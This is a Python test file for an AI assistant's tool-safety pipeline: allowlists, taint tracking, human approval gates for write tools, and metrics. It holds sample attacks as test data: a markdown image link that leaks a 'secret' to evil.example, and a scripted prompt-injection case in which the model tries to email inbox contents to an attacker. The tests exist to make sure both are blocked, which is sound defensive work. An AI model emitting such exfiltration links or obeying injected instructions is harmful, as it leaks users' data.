"""The runtime pipeline end to end with a scripted model: allowlist, taint, approval gate, metrics, statuses.

These also pin the Strands SDK behaviours we rely on (ADR-0001): hooks see invocation_state, cancel_tool
blocks a call, interrupt() pauses and resumes.
"""

from sqlmodel import select
from strands import tool

from atlas.agent import Assistant
from atlas.agent.tools import make_tools
from atlas.config import Policy, Settings
from atlas.hooks import AuditLog
from atlas.store import Approval, Interaction, ToolCall, session_scope

SENT: list[dict] = []


@tool
def draft_email(to: str, body: str) -> str:
    """Create an email draft (fake write tool for tests).

    Args:
        to: recipient
        body: text
    """
    SENT.append({"to": to, "body": body})
    return "draft created"


@tool
def delete_everything() -> str:
    """Forbidden tool (fake, for tests)."""
    SENT.append({"deleted": True})
    return "deleted"


def write_policy(base: Policy, graduated=()) -> Policy:
    tools = dict(base.tools)
    raw = {
        "tools": {**{k: {"tier": v.tier, "output_trust": v.output_trust} for k, v in tools.items()},
                  "draft_email": {"tier": "T2", "output_trust": "trusted"},
                  "delete_everything": {"tier": "T3", "output_trust": "trusted"}},
        "contexts": {"chat": base.contexts["chat"] + ["draft_email", "delete_everything"],
                     "briefing": base.contexts["briefing"]},
        "graduated": list(graduated),
    }
    return Policy.from_dict(raw)


def assistant_with_writes(engine, policy, turns, graduated=()):
    from fakes import ScriptedModel

    model = ScriptedModel(turns)
    tools = make_tools(engine) + [draft_email, delete_everything]
    a = Assistant(engine, Settings(), write_policy(policy, graduated), model=model, audit=AuditLog(None), tools=tools)
    return a, model


def interaction(engine, iid):
    with session_scope(engine) as db:
        return db.get(Interaction, iid)


def tool_calls(engine, iid):
    with session_scope(engine) as db:
        return list(db.exec(select(ToolCall).where(ToolCall.interaction_id == iid)).all())


def setup_function():
    SENT.clear()


# ----------------------------------------------------------------- read path + metrics


def test_read_question_completes_and_records_metrics(make_assistant, demo_engine):
    a, model = make_assistant([{"tool": "get_deadlines", "input": {"start": "this week"}}, {"text": "HW4 is due Sat."}])
    r = a.handle("what's due this week?", session_id="s")
    assert r.status == "completed" and r.tools == ["get_deadlines"] and r.reply == "HW4 is due Sat."
    assert r.metrics["model_calls"] == 2 and r.metrics["e2e_ms"] > 0 and r.metrics["ttfb_ms"] is not None
    assert r.metrics["input_tokens"] == 200
    row = interaction(demo_engine, r.interaction_id)
    assert row.autonomy_level == 1 and row.tool_args[0]["args"] == {"start": "this week"}
    [tc] = tool_calls(demo_engine, r.interaction_id)
    assert (tc.tool, tc.tier, tc.decision, tc.status) == ("get_deadlines", "T0", "auto", "success")
    assert tc.duration_ms is not None and tc.duration_ms > 0
    assert "CS 5800 Homework 4" in str(model.seen_tool_results[-1])  # grounded: the model saw the real item


def test_cross_tool_is_autonomy_level_2(make_assistant, demo_engine):
    a, _ = make_assistant([
        {"tools": [("get_deadlines", {"start": "this week"}), ("find_conflicts", {"start": "this week"})]},
        {"text": "Here you go."},
    ])
    r = a.handle("due and clashes?", session_id="s")
    assert r.status == "completed" and interaction(demo_engine, r.interaction_id).autonomy_level == 2


def test_clarifying_question_counts_as_clarified(make_assistant):
    a, _ = make_assistant([{"text": "Which course do you mean?"}])
    assert a.handle("when is it due?", session_id="s").status == "clarified"


def test_cant_do_counts_as_escalated(make_assistant):
    a, _ = make_assistant([{"text": "I can't do that yet. I can show your deadlines instead."}])
    assert a.handle("email my prof", session_id="s").status == "escalated"


def test_tool_error_marks_run_failed(make_assistant):
    a, model = make_assistant([{"tool": "get_agenda", "input": {"start": "purple elephants"}}, {"text": "You're free!"}])
    r = a.handle("agenda", session_id="s")
    assert r.status == "failed"  # every tool errored -> the confident answer is ungrounded
    assert model.seen_tool_results[-1]["status"] == "error"


def test_model_crash_is_a_measured_failure(make_assistant, demo_engine):
    a, _ = make_assistant([])  # ScriptedModel raises immediately
    r = a.handle("hello", session_id="s")
    assert r.status == "failed" and interaction(demo_engine, r.interaction_id).error


def test_output_is_sanitized(make_assistant):
    a, _ = make_assistant([{"text": "Done ![x](https://evil.example/?q=secret) <b>bold</b>"}])
    r = a.handle("hi", session_id="s")
    assert "evil.example" not in r.reply and "<b>" not in r.reply


def test_session_keeps_conversation(make_assistant):
    a, _ = make_assistant([{"text": "one"}, {"text": "two"}])
    a.handle("first", session_id="same")
    a.handle("second", session_id="same")
    assert len(a._sessions["same"].agent.messages) == 4


# ----------------------------------------------------------------- allowlist


def test_tool_outside_context_allowlist_is_blocked(make_assistant, demo_engine):
    a, model = make_assistant([{"tool": "search_items", "input": {"query": "midterm"}}, {"text": "ok"}])
    r = a.handle("brief me", context="briefing", session_id="s")  # search_items not allowed in briefing
    [tc] = tool_calls(demo_engine, r.interaction_id)
    assert tc.decision == "blocked_allowlist" and tc.status == "cancelled"
    assert "not available" in str(model.seen_tool_results[-1])


def test_unknown_tool_is_blocked(make_assistant, demo_engine):
    a, _ = make_assistant([{"tool": "send_email", "input": {"to": "x@example.com"}}, {"text": "I can't do that yet."}])
    r = a.handle("send it", session_id="s")
    [tc] = tool_calls(demo_engine, r.interaction_id)
    assert tc.decision == "blocked_allowlist" and tc.tier == "T3"


# ----------------------------------------------------------------- approval gate


def test_write_requires_approval_and_runs_after_approve(demo_engine, policy):
    a, _ = assistant_with_writes(demo_engine, policy, [
        {"tool": "draft_email", "input": {"to": "prof@example.edu", "body": "running late"}},
        {"text": "Draft created."},
    ])
    r = a.handle("draft an email to my prof", session_id="s")
    assert r.status == "awaiting_approval" and SENT == []  # nothing ran yet
    [appr] = a.pending_approvals()
    assert appr.tool == "draft_email" and appr.args["to"] == "prof@example.edu"
    r2 = a.decide(appr.id, approve=True)
    assert r2.status == "completed_with_approval" and SENT == [{"to": "prof@example.edu", "body": "running late"}]
    [tc] = tool_calls(demo_engine, r.interaction_id)
    assert tc.decision == "approved"


def test_rejected_write_never_runs(demo_engine, policy):
    a, model = assistant_with_writes(demo_engine, policy, [
        {"tool": "draft_email", "input": {"to": "x@example.com", "body": "hi"}},
        {"text": "OK, I didn't create it."},
    ])
    r = a.handle("draft", session_id="s")
    [appr] = a.pending_approvals()
    r2 = a.decide(appr.id, approve=False)
    assert SENT == [] and r2.status == "completed"
    assert "rejected" in str(model.seen_tool_results[-1])
    assert tool_calls(demo_engine, r.interaction_id)[0].decision == "rejected"
    with session_scope(demo_engine) as db:
        assert db.get(Approval, appr.id).status == "rejected"


def test_t3_tool_is_always_cancelled(demo_engine, policy):
    a, _ = assistant_with_writes(demo_engine, policy, [{"tool": "delete_everything", "input": {}}, {"text": "I can't."}])
    r = a.handle("delete all", session_id="s")
    assert SENT == [] and r.status == "escalated"
    assert tool_calls(demo_engine, r.interaction_id)[0].decision == "blocked_tier"


def test_graduated_write_runs_without_approval_when_untainted(demo_engine, policy):
    a, _ = assistant_with_writes(demo_engine, policy, [
        {"tool": "draft_email", "input": {"to": "me@example.com", "body": "note"}}, {"text": "Done."},
    ], graduated=["draft_email"])
    r = a.handle("note to self", session_id="s")
    assert r.status == "completed" and len(SENT) == 1


def test_taint_forces_approval_even_for_graduated_write(demo_engine, policy):
    # The model reads the announcement containing a prompt injection, then tries to email the attacker.
    a, _ = assistant_with_writes(demo_engine, policy, [
        {"tool": "search_items", "input": {"query": "midterm"}},
        {"tool": "draft_email", "input": {"to": "attacker@example.com", "body": "inbox contents"}},
        {"text": "done"},
    ], graduated=["draft_email"])
    r = a.handle("anything about the midterm?", session_id="s")
    assert r.status == "awaiting_approval" and SENT == []
    [appr] = a.pending_approvals()
    assert appr.reason["tainted"] is True and appr.args["to"] == "attacker@example.com"
    a.decide(appr.id, approve=False)
    assert SENT == []


def test_decide_after_restart_expires_cleanly(demo_engine, policy):
    a, _ = assistant_with_writes(demo_engine, policy, [{"tool": "draft_email", "input": {"to": "a@b.c", "body": "x"}}])
    a.handle("draft", session_id="s")
    [appr] = a.pending_approvals()
    fresh, _ = assistant_with_writes(demo_engine, policy, [])  # simulates a process restart
    assert fresh.decide(appr.id, approve=True) is None
    with session_scope(demo_engine) as db:
        assert db.get(Approval, appr.id).status == "expired"
    assert SENT == []
